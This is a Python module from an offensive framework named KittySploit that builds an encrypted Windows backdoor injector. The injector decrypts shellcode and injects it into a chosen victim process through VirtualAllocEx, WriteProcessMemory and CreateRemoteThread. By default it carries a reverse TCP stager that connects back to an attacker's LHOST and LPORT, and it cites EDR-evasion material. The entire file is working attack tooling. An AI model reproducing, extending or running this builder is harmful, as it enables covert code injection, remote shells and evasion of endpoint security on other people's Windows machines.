#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.compile.backdoor_helpers import build_encrypted_zig_backdoor, option_value
from lib.compile.classic_remote_injection import ClassicRemoteInjectionBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Classic Remote Shellcode Injection",
        "description": (
            "Build an injector EXE that decrypts shellcode and injects it into a remote "
            "process via VirtualAllocEx/WriteProcessMemory/CreateRemoteThread."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://github.com/JoasASantos/Awesome-EDR-Evasion/blob/main/Codes/03_dll_injection_classica.c",
        ],
    }

    payload_path = OptString("payloads/stagers/windows/x86/reverse_tcp", "Payload path", True)
    lhost = OptString("127.0.0.1", "LHOST", True)
    lport = OptPort(4444, "LPORT", True)
    encoder = OptString("", "Encoder (optional)", False)
    target_pid = OptInteger(0, "Target process PID (required at runtime)", True)
    cipher = OptChoice("chacha", "Cipher", True, ["chacha", "rc4"])
    sleep = OptInteger(0, "Sleep ms before injection", False)
    output_name = OptString("remote_inject.exe", "Output filename", False)
    optimization = OptChoice("ReleaseSmall", "Optimization", False, ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"])
    save_source = OptBool(False, "Save C source", False, advanced=True)
    windows_subsystem = OptChoice("console", "Subsystem", False, ["windows", "console"])

    def run(self):
        pid = int(option_value(self, "target_pid") or 0)
        if pid <= 0:
            print_error("Set target_pid to the victim process ID.")
            return False

        builder = ClassicRemoteInjectionBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        return build_encrypted_zig_backdoor(
            self,
            builder,
            build_source_kwargs={"target_pid": pid},
            output_name="remote_inject.exe",
            save_source_name="remote_inject.zig",
            subsystem=str(option_value(self, "windows_subsystem") or "console"),
        )
